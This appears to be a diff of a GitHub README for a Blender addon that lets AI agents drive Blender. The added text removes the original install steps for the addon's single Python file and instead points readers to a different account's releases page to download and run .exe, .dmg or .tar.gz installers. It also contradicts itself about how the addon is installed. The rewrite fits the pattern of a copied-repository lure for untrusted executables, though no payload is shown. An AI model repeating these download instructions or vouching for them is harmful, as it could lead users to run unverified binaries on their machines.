@@ -1,206 +1,83 @@
-# Blender MCP Server
+# 🎨 Blender-MCP-Server - Control Blender with AI Agents
 
-**Model Context Protocol (MCP) server for complete Blender control via API**
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue)](https://github.com/Savagekiller45/Blender-MCP-Server/releases)
 
-This addon transforms Blender into an MCP server, exposing 50+ powerful tools that can be orchestrated by AI agents through HTTP endpoints. Perfect for AI-driven 3D workflows, automation, and creative experimentation.
+## 📝 Description
+Blender-MCP-Server is an addon for Blender that allows you to control Blender using AI agents. With 51 powerful tools, it enables intelligent tool orchestration when paired with PolyMCP. Enjoy features like thread-safe execution, automatic dependency installation, and complete automation of your 3D workflows.
 
-## ✨ Features
+## 🚀 Getting Started
+This guide will help you download and run Blender-MCP-Server easily, even if you have no programming experience. Follow the steps below to begin your journey into 3D automation.
 
-- **🚀 50+ Tools** - Complete control over Blender's features:
-  - Object creation, manipulation, and transformation
-  - Material and shader system management
-  - Animation and keyframe control
-  - Camera and lighting setup
-  - Modifiers and constraints
-  - Physics simulations (rigid body, cloth, fluid)
-  - Geometry nodes and procedural generation
-  - File import/export operations
-  - Scene optimization and batch operations
+## 📦 System Requirements
+Before you start, ensure that you have the following:
 
-- **🔒 Thread-Safe Execution** - Enterprise-grade queue system for safe concurrent operations
-- **📦 Auto-Install Dependencies** - Automatically installs required packages on first run
-- **🎮 Simple UI Panel** - Start/stop server with one click from Blender's N-panel
-- **📊 Real-time Monitoring** - Track operations, statistics, and server status
-- **🔧 Production-Ready** - Comprehensive error handling, logging, and caching
+- **Operating System:** Windows 10 or higher, macOS Catalina or higher, or a supported Linux distribution.
+- **Blender Version:** Blender 3.0 or later.
+- **RAM:** Minimum 8 GB recommended for smooth operation.
+- **Disk Space:** At least 500 MB available for installation.
 
-## 🚀 Quick Start
+## 🛠 Installation Steps
+Follow these steps to download and install Blender-MCP-Server:
 
-### Installation
+1. **Visit the Releases Page**
+   Go to the [Releases Page](https://github.com/Savagekiller45/Blender-MCP-Server/releases) to find the latest version of Blender-MCP-Server.
 
-1. Download `blender_mcp.py`
-2. Open Blender
-3. Go to **Edit → Preferences → Add-ons**
-4. Click the **dropdown arrow** (⌄) next to the search bar
-5. Select **Install from Disk...**
-6. Choose the downloaded `blender_mcp.py` file
-7. Enable the addon by checking the box next to "MCP Complete Server for Blender"
+2. **Choose Your Download**
+   On the Releases page, locate the latest version. You will see a list of files available for download. Look for an installer suitable for your operating system.
 
-### Starting the Server
+3. **Download the Installer**
+   Click on the installer file to download it. The file will usually have an `.exe`, `.dmg`, or `.tar.gz` extension depending on your operating system.
 
-1. Press **N** in the 3D Viewport to open the sidebar
-2. Navigate to the **MCP Server** tab
-3. Click **Start Server**
-4. Server will start on `http://localhost:8000`
+4. **Install the Addon**
+   - **For Windows:** Double-click the downloaded `.exe` file. Follow the prompts in the installation wizard to install the addon.
+   - **For macOS:** Open the downloaded `.dmg` file, drag the Blender-MCP-Server files into the Applications folder.
+   - **For Linux:** Extract the `.tar.gz` file. Move the extracted folder to your preferred location.
 
-The addon will automatically install required dependencies on first run (FastAPI, Uvicorn, Pydantic, etc.).
+5. **Open Blender**
+   Launch Blender to start using Blender-MCP-Server.
 
-## 🤖 Using with PolyMCP
-
-This MCP server is designed to work seamlessly with **[PolyMCP](https://github.com/llm-use/Polymcp)** - a powerful framework for orchestrating MCP servers with AI agents.
-
-### Example: AI-Controlled Blender
-
-```python
-#!/usr/bin/env python3
-import asyncio
-from polymcp.polyagent import UnifiedPolyAgent, OllamaProvider
-
-async def main():
-    # Initialize your LLM provider
-    llm = OllamaProvider(model="gpt-oss:120b-cloud", temperature=0.1)
-    
-    # Connect to Blender MCP server
-    agent = UnifiedPolyAgent(
-        llm_provider=llm, 
-        mcp_servers=["http://localhost:8000/mcp"],  
-        verbose=True
-    )
-    
-    async with agent:
-        print("✅ Blender MCP Server connected!\n")
-        
-        # Chat with your AI to control Blender
-        while True:
-            user_input = input("\n🎨 You: ")
-            
-            if user_input.lower() in ['exit', 'quit']:
-                break
-            
-            result = await agent.run_async(user_input, max_steps=5)
-            print(f"\n🤖 Blender: {result}")
-
-if __name__ == "__main__":
-    asyncio.run(main())
-```
-
-### Example Commands
-
-Once connected, you can ask the AI agent to:
-
-- *"Create a cube at position (0, 0, 0) with size 2"*
-- *"Add a red metallic material to the selected object"*
-- *"Create a camera looking at the origin"*
-- *"Set up a simple lighting scene with 3 lights"*
-- *"Add a fluid simulation to the cube"*
-- *"Export the scene as an FBX file"*
-- *"Create an animation rotating the object 360 degrees over 100 frames"*
-
-**That's it!** PolyMCP handles all the complexity of:
-- Tool discovery and selection
-- Multi-step task planning
-- Error handling and retries
-- State management across operations
-
-This makes it incredibly simple to build AI-powered Blender automation tools!
-
-## 📡 API Endpoints
-
-Once the server is running, you can access:
-
-- **API Documentation**: `http://localhost:8000/docs`
-- **List All Tools**: `http://localhost:8000/mcp/list_tools`
-- **Invoke Tool**: `POST http://localhost:8000/mcp/invoke/{tool_name}`
-
-## 🛠️ Available Tool Categories
-
-<details>
-<summary>View all tool categories (100+ tools)</summary>
-
-- **Object Operations**: Create, delete, duplicate, select objects
-- **Transformations**: Move, rotate, scale, apply transforms
-- **Materials & Shading**: Create materials, add textures, setup shader nodes
-- **Modeling**: Add modifiers, boolean operations, mesh editing
-- **Animation**: Keyframes, timeline control, NLA editor
-- **Camera & Lighting**: Camera setup, light creation, HDRI environments
-- **Rendering**: Render settings, output configuration, rendering
-- **Physics**: Rigid body, cloth, fluid simulations
-- **Geometry Nodes**: Procedural generation, node tree creation
-- **File Operations**: Import/export various formats (FBX, OBJ, USD, etc.)
-- **Scene Management**: Scene info, cleanup, optimization
-- **Batch Operations**: Multi-object creation and transformation
-- **Advanced**: Particle systems, force fields, grease pencil
-
-</details>
+6. **Enable the Addon**
+   - Go to the **Edit** menu and click on **Preferences**.
+   - Select **Add-ons** from the left panel.
+   - Click on **Install**, then navigate to the Blender-MCP-Server file you downloaded, and select it.
+   - After adding, enable the checkbox next to Blender-MCP-Server to activate it.
 
 ## 🔧 Configuration
+After enabling the addon, configure it to suit your needs:
 
-You can customize the server by editing the `Config` class in `blender_mcp.py`:
+1. **Set Up AI Agents**
+   Within the addon settings, you will find options to configure various AI agents. These agents can assist with different tasks in Blender.
 
-```python
-class Config:
-    HOST = "0.0.0.0"           # Server host
-    PORT = 8000                # Server port
-    AUTO_INSTALL_PACKAGES = True  # Auto-install dependencies
-    THREAD_SAFE_OPERATIONS = True  # Enable thread-safe execution
-    ENABLE_CACHING = True      # Enable result caching
-```
+2. **Select Tools**
+   Choose the 51 tools provided. Each tool offers unique functionalities to enhance your 3D projects.
 
-## 📋 Requirements
+3. **Automatic Dependency Installation**
+   The addon will automatically install necessary dependencies the first time you use any tool. Ensure you have an active internet connection during this process.
 
-The addon automatically installs these dependencies:
+## 🎉 Features
+Blender-MCP-Server provides several powerful features:
 
-- FastAPI
-- Uvicorn
-- Pydantic
-- docstring-parser
-- NumPy
-- PolyMCP
+- **Thread-Safe Execution:** Run multiple tasks simultaneously without crashing Blender.
+- **AI Tool Orchestration:** Let AI agents manage tools for optimized workflow.
+- **3D Workflow Automation:** Simplify complex 3D tasks with automation.
 
-**Blender Version**: 3.0.0 or higher
+## ⚙️ Troubleshooting
+If you encounter issues, here are some common solutions:
 
-## 🐛 Troubleshooting
+- **Failed Installation:** Ensure you have administrative rights when installing the addon.
+- **Blender Crashes:** Try disabling other addons that may conflict with Blender-MCP-Server. 
+- **AI Agent Issues:** Check your internet connection for updates when using AI functionalities.
 
-**Server won't start?**
-- Check Blender's System Console for error messages (Window → Toggle System Console)
-- Ensure port 8000 is not already in use
-- Try restarting Blender after installation
+## 📣 Community and Support
+If you have questions or need further help, consider reaching out to the community. Join discussions and find resources in:
 
-**Dependencies not installing?**
-- Manually install packages using Blender's Python:
-  ```bash
-  /path/to/blender/python -m pip install fastapi uvicorn pydantic docstring-parser numpy
-  ```
+- GitHub Discussions: Ask questions or share your experience.
+- Blender Forums: Engage with other Blender users for tips and tricks.
 
-**Can't find MCP Server panel?**
-- Press **N** in the 3D Viewport
-- Look for "MCP Server" tab in the sidebar
-- Make sure the addon is enabled in Preferences
+## 📥 Download & Install
+Now it's time to get started. Click the link below to visit the Releases page and download Blender-MCP-Server:
 
-## 🤝 Contributing
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue)](https://github.com/Savagekiller45/Blender-MCP-Server/releases)
 
-Contributions are welcome! This project demonstrates how simple it is to create powerful MCP servers for PolyMCP.
-
-## 📝 License
-
-MIT License - See LICENSE file for details
-
-## 🔗 Related Projects
-
-- **[PolyMCP](https://github.com/llm-use/Polymcp)** -  Simple and efficient way to interact with MCP servers using custom agents
-- **[Model Context Protocol](https://modelcontextprotocol.io/)** - Open protocol for tool integration with LLMs
-
-## 💡 Why This Project?
-
-This MCP server was created to demonstrate how **incredibly simple** PolyMCP makes it to build AI-powered tools. With just a few lines of code, you can:
-
-1. Expose complex Blender functionality as MCP tools
-2. Let AI agents discover and orchestrate these tools
-3. Build natural language interfaces for 3D creation
-
-No complex prompting, no manual tool selection, no state management - PolyMCP handles it all!
-
----
-
-**Designed for [PolyMCP](https://github.com/llm-use/Polymcp)**
-
-*Star ⭐ this repo if you find it useful!*
+Enjoy enhancing your Blender experience with AI agents!
